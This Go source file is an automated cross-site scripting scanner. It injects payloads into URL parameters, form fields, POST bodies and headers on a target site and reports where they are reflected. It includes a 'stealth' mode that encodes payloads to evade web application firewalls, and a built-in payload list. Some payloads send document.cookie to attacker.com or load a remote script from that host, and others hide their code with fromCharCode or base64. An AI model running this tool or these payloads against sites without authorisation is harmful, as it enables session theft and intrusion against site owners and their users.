package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// Configuration struct for scanner settings
type Config struct {
	URL           string
	Threads       int
	Delay         int
	Timeout       int
	UserAgent     string
	Cookies       string
	PayloadFile   string
	OutputFile    string
	StealthMode   string
	Verbose       bool
	CheckFormOnly bool
	CheckHeaders  bool
	OnlyOneResult bool
}

// Result structure for XSS findings
type Result struct {
	URL     string
	Payload string
	Param   string
	Type    string // GET, POST, Header, etc.
}

// Global variables
var (
	config     Config
	results    []Result
	resultsMux sync.Mutex
	client     *http.Client
	payloads   []string
)

func main() {
	// Parse command line flags
	flag.StringVar(&config.URL, "url", "", "Target URL to scan")
	flag.IntVar(&config.Threads, "threads", 10, "Number of concurrent threads")
	flag.IntVar(&config.Delay, "delay", 0, "Delay between requests in milliseconds")
	flag.IntVar(&config.Timeout, "timeout", 10, "HTTP request timeout in seconds")
	flag.StringVar(&config.UserAgent, "user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36", "Custom User-Agent")
	flag.StringVar(&config.Cookies, "cookies", "", "Cookies to include with requests")
	flag.StringVar(&config.PayloadFile, "payloads", "", "File containing XSS payloads")
	flag.StringVar(&config.OutputFile, "output", "", "Output file to save results")
	flag.StringVar(&config.StealthMode, "stealth", "medium", "Stealth mode: low, medium, high")
	flag.BoolVar(&config.Verbose, "verbose", false, "Verbose output")
	flag.BoolVar(&config.CheckFormOnly, "form-only", false, "Only scan forms")
	flag.BoolVar(&config.CheckHeaders, "check-headers", true, "Check headers for XSS")
	flag.BoolVar(&config.OnlyOneResult, "one-result", false, "Stop after finding the first vulnerability")
	flag.Parse()

	// Validate required parameters
	if config.URL == "" {
		fmt.Println("Error: Target URL is required")
		flag.Usage()
		os.Exit(1)
	}

	// Configure HTTP client with custom settings
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client = &http.Client{
		Transport: tr,
		Timeout:   time.Duration(config.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Load default payloads if no custom file provided
	if config.PayloadFile == "" {
		loadDefaultPayloads()
	} else {
		loadPayloadsFromFile(config.PayloadFile)
	}

	fmt.Printf("[+] XSS Scanner starting with %d payloads\n", len(payloads))
	fmt.Printf("[+] Target: %s\n", config.URL)
	fmt.Printf("[+] Threads: %d\n", config.Threads)
	fmt.Printf("[+] Stealth Mode: %s\n", config.StealthMode)

	// Parse URL for parameters
	targetURL, err := url.Parse(config.URL)
	if err != nil {
		log.Fatalf("Error parsing URL: %v", err)
	}

	// Start scanning
	var wg sync.WaitGroup
	paramsChan := make(chan string)
	
	// Create worker pool for concurrent scanning
	for i := 0; i < config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for param := range paramsChan {
				scanParameter(targetURL, param)
				if config.Delay > 0 {
					time.Sleep(time.Duration(config.Delay) * time.Millisecond)
				}
			}
		}()
	}

	// Extract parameters from URL query
	params := extractParameters(targetURL)
	
	// If no parameters in URL, try to find forms
	if len(params) == 0 && !config.CheckFormOnly {
		fmt.Println("[*] No URL parameters found, checking for HTML forms...")
		formParams := findForms(targetURL.String())
		for _, p := range formParams {
			params = append(params, p)
		}
	}

	// Send parameters to workers
	for _, param := range params {
		paramsChan <- param
	}
	close(paramsChan)
	wg.Wait()

	// Output results
	if len(results) > 0 {
		fmt.Printf("\n[+] Found %d potential XSS vulnerabilities:\n", len(results))
		for i, result := range results {
			fmt.Printf("[%d] %s\n", i+1, result.URL)
			fmt.Printf("    Parameter: %s\n", result.Param)
			fmt.Printf("    Payload: %s\n", result.Payload)
			fmt.Printf("    Type: %s\n\n", result.Type)
		}

		// Save results to file if specified
		if config.OutputFile != "" {
			saveResults(config.OutputFile)
		}
	} else {
		fmt.Println("\n[-] No XSS vulnerabilities found")
	}
}

// Extract parameters from URL
func extractParameters(targetURL *url.URL) []string {
	var params []string
	query := targetURL.Query()
	for param := range query {
		params = append(params, param)
	}
	return params
}

// Find HTML forms in the page
func findForms(targetURL string) []string {
	var formParams []string
	resp, err := sendRequest("GET", targetURL, "", "")
	if err != nil {
		fmt.Printf("[-] Error fetching page for form analysis: %v\n", err)
		return formParams
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Error reading response body: %v\n", err)
		return formParams
	}
	
	// Very basic form parameter extraction - a proper implementation would use a HTML parser
	bodyStr := string(body)
	
	// Find input fields in forms
	inputFields := extractInputFields(bodyStr)
	for _, field := range inputFields {
		if !contains(formParams, field) {
			formParams = append(formParams, field)
		}
	}
	
	if config.Verbose {
		fmt.Printf("[*] Found %d potential form parameters: %v\n", len(formParams), formParams)
	}
	
	return formParams
}

// Extract input field names from HTML
func extractInputFields(html string) []string {
	var fields []string
	// Very simple regex-like extraction - a real implementation would use proper HTML parsing
	lowercaseHTML := strings.ToLower(html)
	
	// Find all instances of input tags
	inputStart := 0
	for {
		inputStart = strings.Index(lowercaseHTML[inputStart:], "<input ")
		if inputStart == -1 {
			break
		}
		
		// Move past the found occurrence for the next iteration
		inputEnd := strings.Index(lowercaseHTML[inputStart:], ">")
		if inputEnd == -1 {
			break
		}
		
		// Extract the input tag
		inputTag := lowercaseHTML[inputStart : inputStart+inputEnd+1]
		inputStart += inputEnd + 1
		
		// Find name attribute
		nameStart := strings.Index(inputTag, "name=")
		if nameStart != -1 {
			nameStart += 5 // Move past "name="
			
			// Find the closing quote
			closingChar := inputTag[nameStart-1]
			nameEnd := strings.Index(inputTag[nameStart:], string(closingChar))
			
			if nameEnd != -1 {
				name := inputTag[nameStart : nameStart+nameEnd]
				fields = append(fields, name)
			}
		}
	}
	
	return fields
}

// Check if a string exists in a slice
func contains(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

// Scan a parameter for XSS vulnerabilities
func scanParameter(targetURL *url.URL, param string) {
	if config.Verbose {
		fmt.Printf("[*] Testing parameter: %s\n", param)
	}

	for _, payload := range payloads {
		// Apply stealth mode transformations
		stealthPayload := applyStealthMode(payload)
		
		// Create a copy of the original URL
		testURL, _ := url.Parse(targetURL.String())
		q := testURL.Query()
		
		// Set the payload for the parameter
		q.Set(param, stealthPayload)
		testURL.RawQuery = q.Encode()
		
		// Send GET request
		resp, err := sendRequest("GET", testURL.String(), "", "")
		if err != nil {
			if config.Verbose {
				fmt.Printf("[-] Error in request: %v\n", err)
			}
			continue
		}
		
		// Check if payload is reflected
		if checkReflection(resp, stealthPayload) {
			resultsMux.Lock()
			results = append(results, Result{
				URL:     testURL.String(),
				Payload: payload,
				Param:   param,
				Type:    "GET",
			})
			resultsMux.Unlock()
			
			fmt.Printf("[!] Potential XSS found in parameter '%s' with payload: %s\n", param, payload)
			
			if config.OnlyOneResult {
				return
			}
		}
		
		resp.Body.Close()
	}
	
	// Test POST requests if not form-only mode
	if !config.CheckFormOnly {
		testPOSTRequest(targetURL.String(), param)
	}
	
	// Test headers if enabled
	if config.CheckHeaders {
		testHeaderInjection(targetURL.String(), param)
	}
}

// Test POST requests for the parameter
func testPOSTRequest(targetURL string, param string) {
	for _, payload := range payloads {
		stealthPayload := applyStealthMode(payload)
		
		// Create POST data
		data := url.Values{}
		data.Set(param, stealthPayload)
		
		// Send POST request
		resp, err := sendRequest("POST", targetURL, data.Encode(), "application/x-www-form-urlencoded")
		if err != nil {
			if config.Verbose {
				fmt.Printf("[-] Error in POST request: %v\n", err)
			}
			continue
		}
		
		// Check if payload is reflected
		if checkReflection(resp, stealthPayload) {
			resultsMux.Lock()
			results = append(results, Result{
				URL:     targetURL,
				Payload: payload,
				Param:   param,
				Type:    "POST",
			})
			resultsMux.Unlock()
			
			fmt.Printf("[!] Potential XSS found in POST parameter '%s' with payload: %s\n", param, payload)
			
			if config.OnlyOneResult {
				return
			}
		}
		
		resp.Body.Close()
	}
}

// Test for XSS in HTTP headers
func testHeaderInjection(targetURL string, header string) {
	// Only test relevant headers
	relevantHeaders := map[string]bool{
		"user-agent":      true,
		"referer":         true,
		"x-forwarded-for": true,
		"cookie":          true,
	}
	
	if !relevantHeaders[strings.ToLower(header)] {
		return
	}
	
	for _, payload := range payloads {
		stealthPayload := applyStealthMode(payload)
		
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}
		
		// Add custom headers
		req.Header.Set("User-Agent", config.UserAgent)
		if config.Cookies != "" {
			req.Header.Set("Cookie", config.Cookies)
		}
		
		// Set payload in specific header
		req.Header.Set(header, stealthPayload)
		
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		
		// Check if payload is reflected
		if checkReflection(resp, stealthPayload) {
			resultsMux.Lock()
			results = append(results, Result{
				URL:     targetURL,
				Payload: payload,
				Param:   header,
				Type:    "Header",
			})
			resultsMux.Unlock()
			
			fmt.Printf("[!] Potential XSS found in header '%s' with payload: %s\n", header, payload)
			
			if config.OnlyOneResult {
				return
			}
		}
		
		resp.Body.Close()
	}
}

// Send HTTP request
func sendRequest(method, url, data, contentType string) (*http.Response, error) {
	var req *http.Request
	var err error
	
	if method == "POST" {
		req, err = http.NewRequest(method, url, strings.NewReader(data))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", contentType)
	} else {
		req, err = http.NewRequest(method, url, nil)
		if err != nil {
			return nil, err
		}
	}
	
	// Set headers
	req.Header.Set("User-Agent", config.UserAgent)
	
	// Add cookies if provided
	if config.Cookies != "" {
		req.Header.Set("Cookie", config.Cookies)
	}
	
	// Add delay based on stealth mode
	stealthDelay := 0
	switch config.StealthMode {
	case "low":
		stealthDelay = 0
	case "medium":
		stealthDelay = 100
	case "high":
		stealthDelay = 500
	}
	
	if stealthDelay > 0 {
		time.Sleep(time.Duration(stealthDelay) * time.Millisecond)
	}
	
	return client.Do(req)
}

// Check if payload is reflected in response
func checkReflection(resp *http.Response, payload string) bool {
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false
	}
	
	// Check if payload is reflected in response body
	return strings.Contains(string(body), payload)
}

// Apply stealth mode transformations to payload
func applyStealthMode(payload string) string {
	switch config.StealthMode {
	case "low":
		// No transformations
		return payload
	case "medium":
		// Basic encoding
		return strings.ReplaceAll(payload, "<", "%3C")
	case "high":
		// More complex encoding to bypass WAFs
		encoded := strings.ReplaceAll(payload, "<", "\\x3C")
		encoded = strings.ReplaceAll(encoded, ">", "\\x3E")
		encoded = strings.ReplaceAll(encoded, "\"", "\\x22")
		encoded = strings.ReplaceAll(encoded, "'", "\\x27")
		encoded = strings.ReplaceAll(encoded, "(", "\\x28")
		encoded = strings.ReplaceAll(encoded, ")", "\\x29")
		return encoded
	default:
		return payload
	}
}

// Load default XSS payloads
func loadDefaultPayloads() {
	payloads = []string{
		"<script>alert('XSS')</script>",
		"<img src=x onerror=alert('XSS')>",
		"<svg onload=alert('XSS')>",
		"javascript:alert('XSS')",
		"\"><script>alert('XSS')</script>",
		"'><script>alert('XSS')</script>",
		"><script>alert('XSS')</script>",
		"</script><script>alert('XSS')</script>",
		"<img src=\"javascript:alert('XSS')\">",
		"<iframe src=\"javascript:alert('XSS')\"></iframe>",
		"\"><img src=x onerror=alert('XSS')>",
		"<div onmouseover=\"alert('XSS')\">hover me</div>",
		"<body onload=alert('XSS')>",
		"<a href=\"javascript:alert('XSS')\">Click me</a>",
		"<input type=\"text\" value=\"\" onfocus=\"alert('XSS')\">",
		"<marquee onstart=\"alert('XSS')\">test</marquee>",
		"<table background=\"javascript:alert('XSS')\"></table>",
		"<object data=\"javascript:alert('XSS')\"></object>",
		"<svg/onload=alert('XSS')>",
		"<audio src=x onerror=alert('XSS')>",
		"><img src=x onerror=alert('XSS')>",
		"<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
		"<script src=\"https://attacker.com/xss.js\"></script>",
		"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
		"<img src=1 onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
	}
}

// Load payloads from file
func loadPayloadsFromFile(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		log.Fatalf("Error opening payload file: %v", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}

	if err := scanner.Err(); err != nil {
		log.Fatalf("Error reading payload file: %v", err)
	}
}

// Save results to file
func saveResults(filename string) {
	file, err := os.Create(filename)
	if err != nil {
		fmt.Printf("[-] Error creating output file: %v\n", err)
		return
	}
	defer file.Close()

	fmt.Fprintf(file, "# XSS Scan Results - %s\n\n", time.Now().Format(time.RFC1123))
	fmt.Fprintf(file, "Target URL: %s\n", config.URL)
	fmt.Fprintf(file, "Scan Date: %s\n", time.Now().Format(time.RFC1123))
	fmt.Fprintf(file, "Payloads Used: %d\n", len(payloads))
	fmt.Fprintf(file, "Vulnerabilities Found: %d\n\n", len(results))

	for i, result := range results {
		fmt.Fprintf(file, "## Vulnerability %d\n", i+1)
		fmt.Fprintf(file, "URL: %s\n", result.URL)
		fmt.Fprintf(file, "Parameter: %s\n", result.Param)
		fmt.Fprintf(file, "Payload: %s\n", result.Payload)
		fmt.Fprintf(file, "Type: %s\n\n", result.Type)
	}

	fmt.Printf("[+] Results saved to %s\n", filename)
}
